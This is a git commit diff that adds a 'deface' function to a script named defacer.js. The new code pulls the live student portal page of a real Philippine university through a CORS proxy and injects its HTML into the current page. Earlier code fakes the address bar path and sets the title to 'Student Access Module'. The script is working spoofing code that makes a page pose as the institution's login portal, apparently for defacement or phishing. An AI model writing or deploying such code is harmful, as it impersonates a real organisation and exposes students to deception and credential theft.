fec935d562de98313b60878119c9a5aba333f5e4
CyberCutie0 <jaytechph0@gmail.com>
2025-01-18 00:41:53 +0800

    Update defacer.js

--- defacer.js
+++ defacer.js
@@ -10,5 +10,26 @@ function changeURL(newUrl, title = '') {
     console.log(`URL replaced with: ${newUrl}`);
 }
 
+function deface(url) {
+    const corsProxyUrl = 'https://corsproxy.io/?url=';
+
+    // Fetch the content using the CORS proxy
+    fetch(corsProxyUrl + url)
+      .then(response => response.text()) // Get the response as text (HTML content)
+      .then(data => {
+        // Create a temporary DOM element to parse the HTML
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(data, 'text/html');
+
+        // Get the body content
+        const bodyContent = doc.body.innerHTML;
+
+        // Append the body content to the current page's body
+        document.body.innerHTML += bodyContent;
+      })
+      .catch(error => console.error('Error:', error));
+}
+
 console.log("DEFACER SUCCESS");
 changeURL('/ucc/students/', 'Student Access Module');
+deface('https://aims.ucc-caloocan.edu.ph/ucc/students/');
